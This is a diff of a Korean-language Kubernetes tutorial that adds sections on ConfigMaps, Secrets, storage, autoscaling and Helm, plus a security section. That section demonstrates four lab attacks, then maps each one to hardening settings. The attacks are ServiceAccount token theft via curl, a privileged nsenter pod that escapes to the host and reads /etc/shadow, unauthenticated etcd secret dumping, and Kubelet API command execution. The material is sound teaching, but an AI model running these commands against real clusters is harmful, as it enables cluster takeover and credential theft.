@@ -244,68 +244,553 @@ kubectl get events   # 클러스터 내 주요 이벤트 로그 확인
 
 ---
 
-## 6. 보안: 클러스터 보호
+## 6. ConfigMap 및 Secret 활용
+
+설정 정보와 민감한 데이터를 코드에서 분리하여 관리한다.
+
+### ConfigMap (일반 설정)
+```yaml
+# config.yaml
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app-config
+data:
+  APP_MODE: "production"
+  LOG_LEVEL: "info"
+  DATABASE_HOST: "mysql-service"
+```
+
+```bash
+# 생성
+kubectl apply -f config.yaml
+
+# 또는 명령어로 직접 생성
+kubectl create configmap app-config --from-literal=APP_MODE=production
+
+# 파일에서 생성
+kubectl create configmap nginx-conf --from-file=nginx.conf
+```
+
+### Secret (민감한 정보)
+```bash
+# 명령어로 생성 (base64 자동 인코딩)
+kubectl create secret generic db-secret \
+  --from-literal=username=admin \
+  --from-literal=password=mysecretpass
+
+# Secret 확인 (base64 인코딩된 상태)
+kubectl get secret db-secret -o yaml
+
+# 디코딩
+kubectl get secret db-secret -o jsonpath='{.data.password}' | base64 -d
+```
+
+### Pod에서 사용
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: app
+spec:
+  containers:
+  - name: app
+    image: myapp:latest
+    envFrom:
+      - configMapRef:
+          name: app-config       # ConfigMap 전체를 환경변수로
+      - secretRef:
+          name: db-secret        # Secret 전체를 환경변수로
+    volumeMounts:
+      - name: config-volume
+        mountPath: /etc/config   # ConfigMap을 파일로 마운트
+  volumes:
+    - name: config-volume
+      configMap:
+        name: app-config
+```
+
+---
+
+## 7. PersistentVolume (스토리지)
+
+Pod가 삭제되어도 데이터를 유지하기 위한 영구 볼륨을 설정한다.
+
+### PV/PVC 개념
+
+| 구성 요소 | 역할 |
+|----------|------|
+| **PersistentVolume (PV)** | 클러스터의 실제 스토리지 (관리자가 프로비저닝) |
+| **PersistentVolumeClaim (PVC)** | 사용자가 스토리지를 요청하는 방법 |
+| **StorageClass** | 동적 프로비저닝 템플릿 |
+
+```mermaid
+flowchart LR
+    Admin["관리자"] -->|생성| PV["PersistentVolume"]
+    User["개발자"] -->|요청| PVC["PersistentVolumeClaim"]
+    PVC -->|바인딩| PV
+    Pod -->|마운트| PVC
+```
+
+### PV 및 PVC 생성
+
+**PersistentVolume (관리자)**
+```yaml
+apiVersion: v1
+kind: PersistentVolume
+metadata:
+  name: pv-local
+spec:
+  capacity:
+    storage: 10Gi
+  accessModes:
+    - ReadWriteOnce          # 단일 노드에서 읽기/쓰기
+  hostPath:
+    path: /data/pv-local     # 로컬 경로 (테스트용)
+  persistentVolumeReclaimPolicy: Retain
+```
+
+**PersistentVolumeClaim (개발자)**
+```yaml
+apiVersion: v1
+kind: PersistentVolumeClaim
+metadata:
+  name: pvc-app
+spec:
+  accessModes:
+    - ReadWriteOnce
+  resources:
+    requests:
+      storage: 5Gi
+```
+
+**Pod에서 사용**
+```yaml
+spec:
+  containers:
+  - name: app
+    volumeMounts:
+      - mountPath: /data
+        name: app-storage
+  volumes:
+    - name: app-storage
+      persistentVolumeClaim:
+        claimName: pvc-app
+```
+
+### 상태 확인
+```bash
+kubectl get pv
+kubectl get pvc
+kubectl describe pvc pvc-app
+```
+
+---
+
+## 8. HPA (자동 스케일링)
+
+CPU/메모리 사용량에 따라 Pod 개수를 자동으로 조절한다.
+
+### Metrics Server 설치 (필수)
+```bash
+kubectl apply -f https://github.com/kubernetes-sigs/metrics-server/releases/latest/download/components.yaml
+
+# 확인
+kubectl top nodes
+kubectl top pods
+```
+
+### HPA 생성
+```bash
+# 명령어로 생성 (CPU 50% 초과 시 최대 10개까지 확장)
+kubectl autoscale deployment nginx-deploy \
+  --cpu-percent=50 \
+  --min=2 \
+  --max=10
+```
+
+**YAML 정의**
+```yaml
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: nginx-hpa
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: nginx-deploy
+  minReplicas: 2
+  maxReplicas: 10
+  metrics:
+  - type: Resource
+    resource:
+      name: cpu
+      target:
+        type: Utilization
+        averageUtilization: 50
+  - type: Resource
+    resource:
+      name: memory
+      target:
+        type: Utilization
+        averageUtilization: 80
+```
+
+### 상태 확인 및 테스트
+```bash
+# HPA 상태 확인
+kubectl get hpa
+
+# 부하 테스트 (다른 터미널에서)
+kubectl run load-test --image=busybox --restart=Never \
+  -- /bin/sh -c "while true; do wget -q -O- http://nginx-service; done"
+
+# Pod 개수 변화 모니터링
+kubectl get pods -w
+```
+
+---
+
+## 9. Helm 기초
+
+Kubernetes 패키지 매니저로, 복잡한 애플리케이션을 쉽게 배포하고 관리한다.
+
+### 설치
+```bash
+# Linux/macOS
+curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
+
+# Windows (Chocolatey)
+choco install kubernetes-helm
+
+# 버전 확인
+helm version
+```
+
+### Helm Chart 사용
+```bash
+# 공식 저장소 추가
+helm repo add bitnami https://charts.bitnami.com/bitnami
+helm repo update
+
+# Chart 검색
+helm search repo nginx
+
+# Chart 정보 확인
+helm show values bitnami/nginx
+
+# 설치
+helm install my-nginx bitnami/nginx
+
+# 설치된 릴리스 확인
+helm list
+
+# 삭제
+helm uninstall my-nginx
+```
+
+### 값 오버라이드
+```bash
+# 설치 시 값 지정
+helm install my-nginx bitnami/nginx --set replicaCount=3
+
+# 또는 파일로
+helm install my-nginx bitnami/nginx -f values.yaml
+```
+
+**values.yaml 예시**
+```yaml
+replicaCount: 3
+service:
+  type: LoadBalancer
+  port: 80
+resources:
+  limits:
+    cpu: 200m
+    memory: 256Mi
+```
+
+---
+
+## 10. 보안 고려사항
 
 Kubernetes는 잘못 설정된 경우 공격자에게 전체 클러스터를 장악할 수 있는 강력한 권한을 제공할 수 있다.
 
-### 주요 위협
+### 10.1. 공격 시연 (Lab 환경)
 
-*   **API Server 노출**: 인증 없이 외부에서 API 서버에 접근 가능한 경우 즉시 클러스터 장악
-*   **ServiceAccount 토큰 탈취**: Pod 내부에 마운트된 토큰(`/var/run/secrets/kubernetes.io/serviceaccount/token`)을 이용해 API 호출
-*   **etcd 평문 저장**: Secret 데이터가 암호화 없이 etcd에 저장되면 백업 유출 시 비밀번호 노출
+#### 공격 1: ServiceAccount 토큰 탈취 → API 서버 접근
 
-### 보안 대책
+Pod 내부에 자동 마운트된 ServiceAccount 토큰을 이용하여 Kubernetes API에 인증하고 클러스터 정보를 수집하는 시나리오이다.
 
-1.  **Pod Security Standards (PSS)**: Privileged Pod 생성을 제한하여 컨테이너 탈출 방지
-    ```yaml
-    # Namespace에 Restricted 정책 적용
-    kubectl label namespace default pod-security.kubernetes.io/enforce=restricted
-    ```
+**[취약한 환경]**
+*   Pod에 `automountServiceAccountToken: true` (기본값)
+*   ServiceAccount에 과도한 RBAC 권한 부여
 
-2.  **RBAC 최소 권한**: `cluster-admin`은 최소한의 사용자에게만 부여하고, 네임스페이스별로 권한 분리
-    ```yaml
-    # 특정 네임스페이스에서만 Pod 읽기 권한
-    apiVersion: rbac.authorization.k8s.io/v1
-    kind: Role
-    metadata:
-      namespace: dev-team
-      name: pod-reader
-    rules:
-    - apiGroups: [""]
-      resources: ["pods"]
-      verbs: ["get", "list"]
-    ```
+**[공격 과정]**
+```bash
+# 1. Pod 내부에서 토큰 확인
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
 
-3.  **ServiceAccount 토큰 비활성화**: Pod에 불필요한 경우 자동 마운트 비활성화
-    ```yaml
-    spec:
-      automountServiceAccountToken: false
-    ```
+# 2. 환경 변수에서 API 서버 주소 확인
+echo $KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT
 
-4.  **etcd 암호화**: Secret 데이터를 암호화하여 저장
-    ```yaml
-    # /etc/kubernetes/encryption-config.yaml
-    apiVersion: apiserver.config.k8s.io/v1
-    kind: EncryptionConfiguration
-    resources:
-      - resources: ["secrets"]
-        providers:
-          - aescbc:
-              keys:
-                - name: key1
-                  secret: <BASE64_ENCODED_KEY>
-    ```
+# 3. 토큰으로 API 호출 (kubectl 없이 curl 사용)
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -k -H "Authorization: Bearer $TOKEN" \
+  https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces/default/secrets
 
-5.  **NetworkPolicy**: Pod 간 통신을 기본 차단하고 필요한 경로만 허용
-    ```yaml
-    # 기본적으로 모든 Ingress 차단
-    apiVersion: networking.k8s.io/v1
-    kind: NetworkPolicy
-    metadata:
-      name: default-deny
-    spec:
-      podSelector: {}
-      policyTypes: ["Ingress"]
-    ```
+# 4. 권한이 있다면 모든 Secret(비밀번호, API키) 탈취 가능
+```
+
+**[공격 결과]**: Pod 침투 → ServiceAccount 권한으로 클러스터 API 접근 🔓
+
+---
+
+#### 공격 2: Privileged Pod 생성 → 노드 탈출
+
+클러스터에 Pod 생성 권한이 있는 계정을 탈취한 후, Privileged Pod를 배포하여 워커 노드를 장악하는 시나리오이다.
+
+**[취약한 환경]**
+*   Pod Security Standards 미적용 (Privileged Pod 생성 허용)
+*   공격자가 `pods/create` 권한을 가진 계정 탈취
+
+**[공격 과정]**
+```yaml
+# malicious-pod.yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: attacker-pod
+spec:
+  hostPID: true      # 호스트 PID 네임스페이스 공유
+  hostNetwork: true  # 호스트 네트워크 공유
+  containers:
+  - name: pwn
+    image: alpine
+    command: ["nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "/bin/bash"]
+    securityContext:
+      privileged: true  # 모든 권한 부여
+```
+
+```bash
+# 1. 악성 Pod 배포
+kubectl apply -f malicious-pod.yaml
+
+# 2. Pod에 접속하면 이미 호스트 루트 상태
+kubectl exec -it attacker-pod -- /bin/bash
+whoami  # root (호스트)
+cat /etc/shadow
+```
+
+**[공격 결과]**: Pod 생성 권한 → 노드 루트 획득 → 클러스터 전체 위협 🔓
+
+---
+
+#### 공격 3: etcd 직접 접근 → Secret 평문 탈취
+
+잘못 설정된 etcd가 인증 없이 노출되거나, etcd 백업 파일을 탈취하여 Secret을 평문으로 추출하는 시나리오이다.
+
+**[취약한 환경]**
+*   etcd가 `--client-cert-auth=false`로 실행
+*   etcd 데이터 암호화(EncryptionConfiguration) 미적용
+
+**[공격 과정]**
+```bash
+# 1. etcd 클라이언트로 접근 (인증 없이)
+etcdctl --endpoints=https://<etcd-ip>:2379 get /registry/secrets/default/my-secret
+
+# 2. 또는 etcd 백업 파일에서 추출
+strings snapshot.db | grep -A5 "password"
+
+# 3. Base64 디코딩
+echo "cGFzc3dvcmQxMjM=" | base64 -d
+# password123
+```
+
+**[공격 결과]**: etcd 접근 → 모든 Secret(DB 비밀번호, TLS 키 등) 노출 🔓
+
+---
+
+#### 공격 4: Kubelet API 미인증 접근
+
+Kubelet API가 익명 인증을 허용하는 경우, 해당 노드의 모든 Pod에 명령을 실행할 수 있다.
+
+**[취약한 환경]**
+*   Kubelet 설정: `--anonymous-auth=true`
+*   Kubelet 포트(10250) 외부 노출
+
+**[공격 과정]**
+```bash
+# 1. Kubelet API로 Pod 목록 조회
+curl -k https://<node-ip>:10250/pods
+
+# 2. 특정 Pod에 명령 실행
+curl -k -X POST "https://<node-ip>:10250/run/<namespace>/<pod-name>/<container-name>" \
+  -d "cmd=cat /etc/shadow"
+```
+
+**[공격 결과]**: 노드 Kubelet 접근 → 해당 노드의 모든 Pod 제어 🔓
+
+---
+
+### 10.2. 방어 대책
+
+위 공격들을 방어하기 위한 보안 설정이다. **각 공격에 대응하는 방어책을 매핑**한다.
+
+| 공격 | 방어 |
+|:---|:---|
+| ServiceAccount 토큰 탈취 | 방어 1, 2 |
+| Privileged Pod 생성 | 방어 3 |
+| etcd 평문 탈취 | 방어 4 |
+| Kubelet 미인증 접근 | 방어 5 |
+
+---
+
+#### 방어 1: ServiceAccount 토큰 자동 마운트 비활성화
+
+불필요한 Pod에는 ServiceAccount 토큰을 마운트하지 않는다.
+
+```yaml
+# Pod 또는 ServiceAccount에 설정
+spec:
+  automountServiceAccountToken: false
+```
+
+---
+
+#### 방어 2: RBAC 최소 권한 원칙
+
+`cluster-admin`은 극히 제한된 사용자에게만 부여하고, 네임스페이스별로 필요한 최소 권한만 부여한다.
+
+```yaml
+# 특정 네임스페이스에서만 Pod 읽기 권한
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  namespace: dev-team
+  name: pod-reader
+rules:
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: read-pods
+  namespace: dev-team
+subjects:
+- kind: User
+  name: developer
+roleRef:
+  kind: Role
+  name: pod-reader
+  apiGroup: rbac.authorization.k8s.io
+```
+
+---
+
+#### 방어 3: Pod Security Standards (PSS) 적용
+
+Namespace에 `Restricted` 정책을 적용하여 Privileged Pod 생성을 원천 차단한다.
+
+```bash
+# Namespace에 Restricted 정책 강제
+kubectl label namespace production pod-security.kubernetes.io/enforce=restricted
+kubectl label namespace production pod-security.kubernetes.io/warn=restricted
+```
+
+```yaml
+# 안전한 Pod 예시 (Restricted 정책 통과)
+spec:
+  securityContext:
+    runAsNonRoot: true
+    seccompProfile:
+      type: RuntimeDefault
+  containers:
+  - name: app
+    securityContext:
+      allowPrivilegeEscalation: false
+      capabilities:
+        drop: ["ALL"]
+```
+
+---
+
+#### 방어 4: etcd 암호화 (EncryptionConfiguration)
+
+Secret 데이터를 etcd에 암호화하여 저장한다.
+
+```yaml
+# /etc/kubernetes/encryption-config.yaml
+apiVersion: apiserver.config.k8s.io/v1
+kind: EncryptionConfiguration
+resources:
+  - resources: ["secrets"]
+    providers:
+      - aescbc:
+          keys:
+            - name: key1
+              secret: <BASE64_ENCODED_32_BYTE_KEY>
+      - identity: {}  # 기존 평문 데이터 읽기용
+```
+
+```bash
+# API 서버 설정에 추가
+kube-apiserver --encryption-provider-config=/etc/kubernetes/encryption-config.yaml
+```
+
+---
+
+#### 방어 5: Kubelet 인증 강화
+
+익명 인증을 비활성화하고, 클라이언트 인증서 기반 인증을 강제한다.
+
+```yaml
+# /var/lib/kubelet/config.yaml
+authentication:
+  anonymous:
+    enabled: false  # 익명 접근 차단
+  webhook:
+    enabled: true
+authorization:
+  mode: Webhook    # API 서버를 통한 인가
+```
+
+---
+
+#### 방어 6: NetworkPolicy로 Pod 간 통신 제한
+
+기본적으로 모든 Ingress를 차단하고, 필요한 경로만 화이트리스트로 허용한다.
+
+```yaml
+# 모든 Ingress 기본 차단
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: default-deny-all
+  namespace: production
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress
+```
+
+---
+
+#### 방어 7: Admission Controller (OPA/Gatekeeper)
+
+정책 기반 Admission Controller를 배포하여 위험한 Pod 설정을 사전에 거부한다.
+
+```bash
+# Gatekeeper 설치
+kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/master/deploy/gatekeeper.yaml
+
+# ConstraintTemplate으로 정책 정의 (예: privileged=true 차단)
+```
+
+> **Tip**: 클라우드 환경에서는 **AWS EKS Pod Identity**, **GKE Workload Identity**, **Azure Workload Identity**를 사용하여 ServiceAccount 토큰 대신 클라우드 IAM을 활용하면 더 안전하다.
 
 <hr class="short-rule">
